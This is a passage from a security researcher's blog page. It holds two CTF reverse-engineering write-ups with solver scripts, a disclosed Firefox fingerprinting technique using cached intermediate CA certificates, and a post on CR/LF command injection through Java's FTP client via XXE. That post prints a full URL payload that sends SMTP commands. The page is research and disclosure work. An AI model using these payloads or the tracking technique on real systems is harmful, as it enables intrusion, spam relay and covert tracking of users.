+    <span class="k">if</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"bohxudohMeiteipiVaeZ"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"yuGhoxeebaivaiteifai"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"=pwbyte"</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"chahghoaThoariaCowoh"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"ret "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"shumeesaiXoohigheari"</span><span class="p">]))</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"ayahshecieleeYeingis"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"sebeeluoCaedohlaehoh"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"IeCilahWaishaibiemoo"</span><span class="p">]))</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"DaweeyeiZaiceemeitah"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"iesheiQuiphaipohquei"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"="</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Koobaicahxaexeicohno"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"+"</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"OhNgaesiequievaijaca"</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"geethahshiuxiyeitooH"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"SheixienaigeeSaeHahC"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"="</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"looheThedohsouquoogo"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"-"</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"UaYaDaeciekeemeehein"</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"uDohngaephaethahngah"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"ietaiviexuaniequeZie"</span><span class="p">]</span> <span class="o">+</span><span class="s">"="</span><span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"saichuqueiShieRaeYie"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"^"</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"RahThiefudeimahhohch"</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"AhkiexaZeishieKohqui"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"eepuozeeviexoopieMoi"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"="</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"aageenuxeLaeBaidoaru"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"|"</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"PeGoawoowiuthoobaaTh"</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"riatheihoxooziitahGo"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"eishaBeiwiYahSiexaem"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"="</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"IsichaikuaNeiHahRaiH"</span><span class="p">]</span> <span class="o">+</span> <span class="s">"&amp;"</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"thuyaecenaethiPochie"</span><span class="p">])</span>
+    <span class="k">elif</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"Jeicheidahmeichetaik"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"ieZieyiechooTeilaexe"</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">equahSohNeohoonohphu</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">equahSohNeohoonohphu</span><span class="o">.</span><span class="n">has_key</span><span class="p">(</span><span class="s">"ZeiteesohpiefeeyuHah"</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">equahSohNeohoonohphu</span><span class="p">[</span><span class="s">"ZeiteesohpiefeeyuHah"</span><span class="p">]</span> <span class="o">==</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"aNaeNeeyooCeezaiGeeb"</span><span class="p">]:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="s">"jmp "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">equahSohNeohoonohphu</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s">' if '</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="s">"ozeeleephuiGaechaiSh"</span><span class="p">]</span> <span class="o">+</span> <span class="s">'==0'</span><span class="p">)</span>
+                    <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"nop"</span><span class="p">)</span>
+    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre>
+</div>
+
+<p>This leads to the following âcodeâ (first few lines):</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>  1	nop
+  2	ZERO=0
+  3	RES=0
+  4	nop
+  5	ONE=1
+  6	COUNT=0
+  7	nop
+  8	x=pwbyte
+  9	x=x+ONE
+ 10	jmp 13 if x==0
+ 11	COUNT=COUNT+ONE
+ 12	jmp 7 if ZERO==0
+ 13	nop
+ 14	x=28
+ 15	x=COUNT-x
+ 16	jmp 21 if x==0
+ 17	jmp 18 if ZERO==0
+ 18	nop
+ 19	o=-1
+ 20	ret o
+ 21	nop
+ 22	ohhayeexongoakaeVuph=0
+ 23	jmp 24 if ZERO==0
+ 24	nop
+</code></pre>
+</div>
+
+<p>Note that âpwbyteâ represents âread a byte from the input and return -1 if we
+read beyond the string lengthâ. So we read byte by byte and increase <code class="highlighter-rouge">COUNT</code> by
+<code class="highlighter-rouge">ONE</code>. Line 14 to 16 show us that our flag needs to be 28 characters long,
+since otherwise we would return -1.</p>
+
+<p>Letâs continue:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code> 25	A=pwbyte
+ 26	B=77
+ 27	C=A-B
+ 28	RES=RES|C
+ 29	A=pwbyte
+ 30	B=82
+ 31	C=A-B
+ 32	RES=RES|C
+ 33	A=pwbyte
+ 34	B=77
+ 35	C=A-B
+ 36	RES=RES|C
+</code></pre>
+</div>
+
+<p>Oh, 77, 82, 77, or <code class="highlighter-rouge">M</code>, <code class="highlighter-rouge">R</code>, <code class="highlighter-rouge">M</code> again. This looks good! And from the equations
+we can see that our input needs to be exactly these values in order to keep
+<code class="highlighter-rouge">RES</code> (which will be returned at the very end) nicely at 0.</p>
+
+<p>The code continues similarly, but gets a bit more complex:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[...]
+ 49	X=pwbyte
+ 50	t=7
+ 51	Y=X-t
+ 52	t=90
+ 53	C=Y^t
+ 54	RES=RES|C
+ 55	X=pwbyte
+ 56	t=15
+ 57	Y=X-t
+ 58	t=80
+ 59	C=Y^t
+[...]
+ 79	X=pwbyte
+ 80	t=999
+ 81	Y=t-X
+ 82	t=900
+ 83	C=Y^t
+ 84	RES=RES|C
+ 85	X=pwbyte
+ 86	t=1
+ 87	Y=t+X
+ 88	t=102
+ 89	C=Y-t
+ 90	RES=RES|C
+[...]
+</code></pre>
+</div>
+
+<p>One could solve all these things algebraically, but luckily for me my
+âdecompilerâ outputs syntactically valid Python, so I was lazy and brute-forced
+each character by looping over possible <code class="highlighter-rouge">pwbyte</code> values and checking when <code class="highlighter-rouge">RES</code>
+ended up being 0.</p>
+
+<p>During the CTF I did this manually with a bit of copy-and-paste and running
+python, but for the sake of âAUTOMATE ALL THE THINGS!!111ELFâ, hereâs a script that does the same:</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">START_CODE</span> <span class="o">=</span> <span class="s">"for pwbyte in range(128):</span><span class="se">\n\t</span><span class="s">RES = 0</span><span class="se">\n</span><span class="s">"</span>
+
+<span class="n">code</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'code'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+
+<span class="n">current_block</span> <span class="o">=</span> <span class="n">START_CODE</span>
+<span class="c"># start at line 25, after the length check</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)):</span>
+    <span class="n">current_block</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span> <span class="o">+</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+    <span class="k">if</span> <span class="s">'RES='</span> <span class="ow">in</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span> <span class="c"># RES gets assigned, we want this to be 0</span>
+        <span class="n">current_block</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\t</span><span class="s">if RES == 0:</span><span class="se">\n</span><span class="s">"</span>
+        <span class="n">current_block</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\t\t</span><span class="s">print(chr(pwbyte), end='')</span><span class="se">\n</span><span class="s">"</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"Current code block:</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">current_block</span><span class="p">)</span>
+        <span class="k">exec</span><span class="p">(</span><span class="n">current_block</span><span class="p">)</span> <span class="c"># don't run on untrusted input ;-)</span>
+        <span class="n">current_block</span> <span class="o">=</span> <span class="n">START_CODE</span>
+<span class="k">print</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<p>Running it gives us the flag:</p>
+
+<pre><code class="language-.sh">$Â ./bruteforce.py 2&gt;/dev/null
+MRMCD{a_processor_in_python}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/09/10/mrmcdctf-writeup-once-upon-a-time/">mrmcd CTF writeup: Once Upon A Time</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2017-09-10T08:45:00+00:00" itemprop="datePublished">Sep 10, 2017</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I recently participated in the <a href="https://ctf.mrmcd.net">MRMCD CTF</a>, which had
+a challenge called âOnce Upon A Timeâ. The hint for the binary was that
+it will simply print the flag â¦ but some patience might be required.</p>
+
+<p>Since I am way less binary reverse-engineering ninja than might appear
+from the scoreboard, I threw the binary into the
+<a href="https://derevenets.com/">Snowman</a> decompiler.</p>
+
+<p>Here, I could recognize the following structure quickly:</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">do</span> <span class="p">{</span>
+	<span class="n">v5</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">v5</span><span class="p">)</span> <span class="p">{</span>
+		<span class="o">++</span><span class="n">v5</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="o">--</span><span class="n">v4</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">v4</span> <span class="o">!=</span> <span class="mi">77</span><span class="p">);</span>
+<span class="n">fun_640</span><span class="p">(</span><span class="s">"%d done</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="s">"%d done</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+
+<span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">do</span> <span class="p">{</span>
+	<span class="n">v7</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">v7</span><span class="p">)</span> <span class="p">{</span>
+		<span class="o">++</span><span class="n">v7</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="o">--</span><span class="n">v6</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">v6</span> <span class="o">!=</span> <span class="mi">82</span><span class="p">);</span>
+<span class="n">fun_640</span><span class="p">(</span><span class="s">"%d done</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="s">"%d done</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+
+<span class="p">[...]</span>
+</code></pre>
+</div>
+
+<p>So the challenge hint was technically correct, the inner <code class="highlighter-rouge">while</code> loop would run
+until the (int64) <code class="highlighter-rouge">v5</code> would overflow and become 0, while the outer loop would
+terminate eventually when <code class="highlighter-rouge">v4</code> was decreased from 2**64 to 77.</p>
+
+<p>At this point, one could have patched the
+decrements into increments and vice-versa, but that seemed quite tedious.</p>
+
+<p>If you squint closely though, you can notice that the desired values for <code class="highlighter-rouge">v4</code>
+and <code class="highlighter-rouge">v6</code> correspond to the ASCII characters <code class="highlighter-rouge">M</code> and <code class="highlighter-rouge">R</code>, the usual start of a
+flag. During the CTF I just proceeded to manually convert them and concatenated
+them, but for the sake of (useless?) automation hereâs a one-liner to get the
+flag:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>grep <span class="s1">'} while (v'</span> once_upon_a_time.c | cut -d<span class="s1">'='</span> -f2 | cut -d <span class="s1">')'</span> -f1 | python -c <span class="s1">'import sys; chars = sys.stdin.readlines(); print("".join([chr(int(c, 0)) for c in chars]))'</span>
+MRMCD<span class="o">{</span>so_sorry_for_the_delay<span class="o">}</span>
+</code></pre>
+</div>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/02/21/fingerprinting-firefox-users-with-cached-intermediate-ca-certificates-fiprinca/">Fingerprinting Firefox users with cached intermediate CA certificates (#fiprinca)</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2017-02-21T10:13:00+00:00" itemprop="datePublished">Feb 21, 2017</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>[TLDR: Firefox caches intermediate CA certificates. A third-party website can infer which intermediates are cached by a user. To do this, it loads content from incorrectly configured hosts (missing intermediate in the provided certificate chain) and observes whether they load correctly (yes: corresponding intermediate was cached, no: it was not). Check out my <a href="https://fiprinca.0x90.eu/poc/">proof of concept</a> using more than 300 intermediate CAs. This technique can be used to gain a fingerprint for a user but also leaks semantic information (mainly geographical). Since Private Browsing mode does not isolate the cache, it can be used to link a Private Browsing user to her real profile. Furthermore, attackers could force users to visit correctly configured websites with unusal intermediates and thus set a kind of supercookie. This has been reported as <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1334485">#1334485</a> in the Mozilla bug tracker.]</p>
+
+<p><strong>The idea</strong></p>
+
+<p>A few months ago, I was sitting in Ivan RistiÄâs course <a href="https://www.feistyduck.com/training/the-best-ssl-and-tls-training-in-the-world">Â»The Best TLS Training in the WorldÂ«</a> (which I highly recommend, by the way). One thing Ivan was mentioning is the fact that probably <em>the</em> most common misconfiguration in setting up a TLS webserver is forgetting to deliver the complete certificate chain. Let me use some pictures to explain it. Here is the correct case:</p>
+
+<p><img src="/static/correct_case.png" alt="Correctly configured" /></p>
+
+<p>In case the server is misconfigured, the situation looks as follows:</p>
+
+<p><img src="/static/incorrect_case.png" alt="Incorrectly configured" /></p>
+
+<p>An idea came to my mind: if the behaviour is different depending on the cache, can I observe that from the outside? A quick look around on <a href="https://www.ssllabs.com">ssllabs.com</a> for a site with incomplete chain and a <code class="highlighter-rouge">&lt;img src=https://brokensite/favicon.ico onload=alert(1) onerror=alert(2)&gt;</code> showed me that this was indeed feasible in Firefox (Chrome and Internet Explorer somehow both magically load the image/site even when the chain is not delivered â possibly using the caIssuer extension?). Interestingly enough, the cached CAs from the main profile were also used in Private Browsing mode.</p>
+
+<p><strong>Gathering data</strong></p>
+
+<p>Lurking around ssllabs.com to find new hosts with incomplete chains did not sound like a fun idea, and I guess Qualys would not have been too happy if I automated the process. So I had to come up with a better way to gather hosts for a proof of concept. Luckily, there are public datasets of the TLS server landscape available. The two that I ended up using were the <a href="https://censys.io/login?came_from=https%3A%2F%2Fcensys.io%2Fdata%2F443-https-tls-full_ipv4">Censys.io</a> scan (free researcher account needed) and the <a href="https://scans.io/study/sonar.ssl">Rapid7 Project Sonar</a> (free to download) ones.</p>
+
+<p>In the first step, I wanted to identify all possible intermediate CA certificates that chain up to a trusted root CA. For this, I downloaded the <a href="https://curl.haxx.se/docs/caextract.html">Root CA extract</a> provided by the curl project. Then I looked at all CA certificates in the datasets and checked with <code class="highlighter-rouge">openssl verify</code> to see if they are a direct intermediate of one of the trusted roots. To further identify intermediate CAs that chain up to a trusted root in a longer path, I ran this process in an iterative fashion using the root CAs and already identified intermediates until no more new intermediates were found in the datasets. I ended up with 3366 individual CA certificates that chain up to a trusted root (1931 on the first level, 1286 on the second level, 92 on the third level and 57 on the fourth level).</p>
+
+<p>The next step was identifying websites which were misconfigured. For this, the Project Sonar data came in handy as they scan the complete IPv4 internet and record the delivered certificate chain for each IP on port 443. Since they provide the certificates individually and the scan data only contains hashes of the chain elements, I first had to import all the certificates into a SQLite database in order to quickly look them up by hash. Despite ending up with a database file of roughly 100 GB, SQLite performed quite nicely. I then processed this data by looking at all certificates to see if they contained an issuer (by looking at the Authority Key Identifier extension) that was present in my set of CAs, but not delivered in the chain. If this was the case, I had identified the IP address of a misconfigured host. Now it was necessary to see if the certificate used a hostname which actually resolved to that IP address. If that was the case, I had a candidate for an incorrectly configured webserver.</p>
+
+<p>The last step was to identify a working image on that webserver which can be loaded. I considered several options but settled on just loading the website in Firefox and observing using Burp which images were loaded. This left me with a Burp state file of several gigabytes and a list of plenty of URLs for more than 300 individual intermediate CAs.</p>
+
+<p><strong>The proof of concept</strong></p>
+
+<p>I used this list of URLs to build a <a href="https://fiprinca.0x90.eu/poc/">proof of concept</a> using <a href="http://elm-lang.org">elm</a>, my favourite way to avoid writing JavaScript these days. Here is how a part of the output (and Firebugâs Net Panel to see which images are loaded) looks for me:</p>
+
+<p><img src="/static/poc.png" alt="PoC output" /></p>
+
+<p>Note that it might occasionally contain false positives or false negatives, since the servers that are used for testing are not under my control and might change their TLS configuration and/or location of images.</p>
+
+<p>If you run the proof of concept yourself, you will be presented with an option to share your result with me. Please do so â I am grateful for every data point obtained in this way to see what additional information can be extracted from it (geographical location? specific interests of the user? etc.).</p>
+
+<p><strong>Further ideas</strong></p>
+
+<p>One thing that is pretty easy to see is that this technique could also be used in a more active way by forcing users to visit correctly configured websites from unusual intermediates. Note that for example the PKI of the Â»Deutsches ForschungsnetzwerkÂ« comes in handy here, as it provides literally hundreds of (managed) intermediates for their members, including lots of tiny universities or research institutes. One could force to user to cache a certain subset of unusal intermediates and then check later from a different domain which intermediates are set. This is of course not foolproof, since users might visit correctly configured websites from those intermediates and thus flip bits from 0 to 1. Error-correcting codes could be used here (with the tradeoff of having to use more intermediates) to deal with that problem.</p>
+
+<p>In addition to the purely Â»statisticalÂ« view of having a fingerprint with a sequence of n bits representing the cache status for each tested CA, the fingerprint also contains additional semantic information. Certain CAs have customers mostly in one country or region, or might have even more specific use-cases which letâs you infer even more information â i.e. a user who has the Â»Deutsche Bundestag CAÂ« cached is most probably located in Germany and probably at least somewhat interested in politics.</p>
+
+<p>From an attackerâs perspective, this could also be used to check if the browser is running inside a malware analysis sandbox (which would probably have none or very few of the common intermediates cached) and delivering different content based on that information.</p>
+
+<p><strong>Solutions</strong></p>
+
+<p>I reported the problem on January 27th, 2017 to Mozilla in bug <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1334485">#1334485</a>. The cleanest solution would obviously be to not connect to incorrectly configured servers, regardless of whether the intermediate is cached or not. Understandably, Mozilla is reluctant to implement that without knowing the impact. Thus bug <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1336226">#1336226</a> has been filed to implement some related telemetry â letâs see how that goes.</p>
+
+<p>From a userâs perspective, at the moment I can only recommend to regularly clean up your profile (by creating a fresh one, cleaning it up from the Firefox UI or using the certutil command line tool). Alternatively, blocking third-party requests with an addon such as <a href="https://addons.mozilla.org/en-US/firefox/addon/requestpolicy/">Request Policy</a> might be useful since the attack obviously needs to make (a lot of) third-party requests.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/02/18/smtp-over-xxe/">SMTP over XXE â how to send emails using Java's XML parser</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2017-02-18T13:43:00+00:00" itemprop="datePublished">Feb 18, 2017</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I regularly find <a href="https://en.wikipedia.org/wiki/XML_external_entity_attack">XML eXternal Entity (XXE)</a> vulnerabilities while performing penetration tests. These are particularly often present in Java-based systems, where the default for most XML parsers still is parsing and acting upon inline DTDs, even though I have not seen a single use case where this was really neceassary. While the vulnerability is useful for file disclosures (and Java is nice enough to also provide directory listings) or even process listings (via /proc/<code class="highlighter-rouge">pid</code>/cmdline), recently I stumbled over another interesting attack vector when using a Java XML parser.</p>
+
+<p>Out of curiosity, I looked at what protocols would be supported in external entities. In addition to the usual such as <code class="highlighter-rouge">http</code> and <code class="highlighter-rouge">https</code>, Java also supports <code class="highlighter-rouge">ftp</code>. The actual connection to the FTP server is implemented in <a href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/sun/net/ftp/impl/FtpClient.java">sun.net.ftp.impl.FtpClient</a>. It supports authentication, so we can put usernames and passwords in the URL such as in <code class="highlighter-rouge">ftp://user:password@host:port/file.ext</code> and the FTP client will send the corresponding <code class="highlighter-rouge">USER</code> command in the connection.</p>
+
+<p>The (presumably ancient) code has a bug, though: it does not verify the syntax of the user name. <a href="https://www.ietf.org/rfc/rfc959.txt">RFC 959</a> specifies that a username may consist of a sequence of any of the 128 ASCII characters except <code class="highlighter-rouge">&lt;CR&gt;</code> and <code class="highlighter-rouge">&lt;LF&gt;</code>. Guess what the JRE implementers forgot? Exactly â to check for the presence of <code class="highlighter-rouge">&lt;CR&gt;</code> or <code class="highlighter-rouge">&lt;LF&gt;</code>. This means that if we put <code class="highlighter-rouge">%0D%0A</code> anywhere in the user part of the URL (or the password part for that matter), we can terminate the USER (or PASS) command and inject a new command into the FTP session.</p>
+
+<p>While this may be interesting on its own, it allows us to do something else: to speak SMTP instead of FTP. Note that for historical reasons, the two protocols are structurally very similar. For example, on connecting, they both send a reply with a 220 code and text:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ nc ftp.kernel.org 21
+220 Welcome to kernel.org
+$ nc mail.kernel.org 25
+220 mail.kernel.org ESMTP Postfix
+</code></pre>
+</div>
+
+<p>So, if we send a <code class="highlighter-rouge">USER</code> command to a mail server instead of a FTP server, it will answer with an error code (since <code class="highlighter-rouge">USER</code> is not a valid SMTP command), but let us continue with our session. Combined with the bug mentioned above, this allows us to send arbitrary SMTP commands, which allows us to send emails. For example, letâs set the URL to the following (newlines added for readability):</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>ftp://a%0D%0A
+EHLO%20a%0D%0A
+MAIL%20FROM%3A%3Ca%40example.org%3E%0D%0A
+RCPT%20TO%3A%3Calech%40alech.de%3E%0D%0A
+DATA%0D%0A
+From%3A%20a%40example.org%0A
+To%3A%20alech%40alech.de%0A
+Subject%3A%20test%0A
+%0A
+test!%0A
+%0D%0A
+.%0D%0A
+QUIT%0D%0A
+:a@shiftordie.de:25/a
+</code></pre>
+</div>
+
+<p>When <code class="highlighter-rouge">sun.net.ftp.impl.FtpClient</code> connects using this URL, the following commands will be sent to the mail server at shiftordie.de:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>USER a&lt;CR&gt;&lt;LF&gt;
+EHLO a&lt;CR&gt;&lt;LF&gt;
+MAIL FROM:&lt;a@example.org&gt;&lt;CR&gt;&lt;LF&gt;
+RCPT TO:&lt;alech@alech.de&gt;&lt;CR&gt;&lt;LF&gt;
+DATA&lt;CR&gt;&lt;LF&gt;
+From: a@example.org&lt;LF&gt;
+To: alech@alech.de&lt;LF&gt;
+Subject: test&lt;LF&gt;
+&lt;LF&gt;
+test!&lt;LF&gt;&lt;CR&gt;&lt;LF&gt;
+.&lt;CR&gt;&lt;LF&gt;
+QUIT&lt;CR&gt;&lt;LF&gt;
+</code></pre>
+</div>
+
+<p>From Javaâs perspective, the âFTPâ connection fails with a <code class="highlighter-rouge">sun.net.ftp.FtpLoginException: Invalid username/password</code>, but the mail is already sent.</p>
+
+<p>This attack is particularly interesting in a scenario where you can reach an (unrestricted, maybe not even spam- or malware-filtering) internal mail server from the machine doing the XML parsing. It even allows for sending attachments, since the URL length seems to be unrestricted and only limited by available RAM (parsing a 400MB long URL did take more than 32 GBs of RAM for some reason, though ;-)).</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/11/12/http-over-x509-revisited/">A portscan by email â HTTP over X.509 revisited</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2013-11-12T00:00:00+00:00" itemprop="datePublished">Nov 12, 2013</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>
+<i>Disclaimer: This was originally posted on blog.nruns.com. Since n.runs went bankrupt, the blog is defunct now. I reposted this here in July 2015 to preserve it for posteriority.</i>
+</p>
+
+<h2>The history</h2>
+
+<p>
+Design bugs are my favourite bugs. About six years ago, while
+I was working in the Public Key Infrastructure area, I identified
+such a bug in the X.509 certificate chain validation process
+(<a href="https://www.ietf.org/rfc/rfc5280.txt">RFC 5280</a>).
+By abusing the authority information access id-ad-caissuers extension,
+it allowed for triggering (blind) HTTP requests when (untrusted,
+attacker-controlled) certificates were validated. Microsoft was
+one of the few vendors who actually implemented that part of the
+standard and Microsoft CryptoAPI was vulnerable against it. Corresponding
+advisories (<a href="https://www.cynops.de/advisories/AKLINK-SA-2008-004.txt">Office 2007</a>, <a href="https://www.cynops.de/advisories/AKLINK-SA-2008-003.txt">Windows Live Mail</a> and <a href="http://www.cynops.de/advisories/AKLINK-SA-2008-002.txt">Outlook</a>) and a <a href="https://www.cynops.de/techzone/http_over_x509.html">whitepaper</a> were released in April 2008.
+</p>
+
+<p>
+This issue was particularly interesting because it could be
